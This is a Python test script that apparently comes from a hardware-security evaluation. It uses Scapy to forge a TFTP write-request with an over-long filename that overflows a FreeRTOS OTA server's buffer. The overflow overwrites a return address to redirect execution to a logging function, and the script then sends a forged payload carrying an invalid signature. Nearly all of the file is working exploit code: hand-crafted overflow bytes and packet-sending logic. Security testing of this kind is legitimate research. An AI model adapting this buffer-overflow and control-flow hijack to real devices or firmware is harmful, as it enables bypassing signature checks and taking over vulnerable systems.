#! /usr/bin/env python3
"""
TFTP/OTA tests using SCAPY to forge malicious TFTP packets
This program uses the SCAPY module so must be run as ROOT
"""

def spoofTFTP(hostIP, targetIP, TFTPPort):

    # attackString is a malicious "filename" for a TFTP Write-Request packet.
    # The filename herein is too long, so it will overflow the receiver's buffer.
    # The opening character looks like a valid filename "lmcodemo.htm.sig" following
    # by many non-zero padding characters.  The final five bytes are chosen so as to
    # overwrite the return address of the "Receive_And_Process_One_OTA_Request()"
    # function (see fett/apps/freertos/ota.c) and force the return from that
    # function to actually call Write_Payload_To_Log(), followed by a single
    # zero byte to terminate the filename as required by the TFTP WRQ packet format.
    # Note that addresses are LITTLE-ENDIAN, so least-significant byte first
    #
    # TODO - extract the address of Write_Payload_To_Log() using
    #  "nm WorkDir/osImages/FreeRTOS.elf | grep Write_Payload_To_Log"
    # or similar trickery
    #
    # If this attack is successful, then the content of demo_data (below) will
    # be leaked to the Log, even though the signature is invalid
    attackString = bytearray.fromhex("6c 6d 63 6f 64 65 6d 6f 2e 68 74 6d 2e 73 69 67 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 20 6e 1b c0 d0 c8 01 c0 00")

    # demo_data is a forged OTA payload, consisting of 85 bytes:
    #   64 bytes of (incorrect) Ed25519 signature
    #   21 character ASCII String "This should not work\n"
    demo_data = bytearray.fromhex("93 cd 69 8a 13 bd e1 dc 4b 38 0e ad 2c 05 f2 15 7b 50 95 b8 b3 f7 1b 65 ed 60 05 ef 97 f1 de 0d b1 70 d7 55 f5 56 c7 41 5d 73 9d 78 4e d6 af 84 b6 ff 20 00 ff 73 33 ab 7d 5e c1 5f e9 e3 48 0b 54 68 69 73 20 73 68 6f 75 6c 64 20 6e 6f 74 20 77 6f 72 6b 0a")

    sport = 49152 # arbitrary, but avoid use of scapy.RandShort()

    # Construct the TFTP WRQ packet, containing attackString
    basic_ip  = scapy.IP(src=hostIP,dst=targetIP)
    basic_udp = basic_ip/scapy.UDP(sport=sport,dport=TFTPPort)
    WRQ = basic_udp/scapy.TFTP(op=2)/scapy.TFTP_RRQ(filename=attackString,mode="octet")

    print ("WRQ Packet is")
    WRQ.show()

    print ("Sending WRQ...")
    try:
        r = scapy.sr1(WRQ, timeout=3, verbose=True)
    except Exception as exc:
        print (f"Failed to send WRQ with exception {exc}")

    print ("WRQ Response is")
    r.show()

    # Pick up the server's chosen port number as our destination port
    # for subsequent DATA packets
    new_dport = r[scapy.UDP].sport
    new_sport = sport

    # Construct a DATA packet. demo_data is less than 511 characters, so exactly
    # ONE DATA packet is required to complete the protocol
    DATA = basic_ip/scapy.UDP(sport=new_sport, dport=new_dport)/scapy.TFTP(op=3)/scapy.TFTP_DATA(block=1)/scapy.Raw(load=demo_data)
    print ("DATA packet is")
    DATA.show()

    print ("Sending DATA...")
    try:
        r2 = scapy.sr1(DATA, timeout=3, verbose=True)
    except Exception as exc:
        print (f"Failed to send DATA with exception {exc}")

    print ("DATA Response is")
    r2.show()

    return

if __name__ == '__main__':
    import sys
    na = len(sys.argv)
    print (f"Number of args is {na}")
    if (na != 5):
        print ("\n<INVAID> Wrong number of arguments passed to sudoScapy.py\n")
        exit (0)

    # Restore the System Path of the calling program from sys.argv[1]
    parentPath = sys.argv[1].split('+')
    sys.path = list(set(sys.path + parentPath))
    # Now we can import Scapy
    import scapy.all as scapy

    try:
        spoofTFTP (sys.argv[2], sys.argv[3], int(sys.argv[4]))
    except Exception as exc:
        print (f"Failed to spoof TFTP - unhandled exception {exc}")
    exit (0)
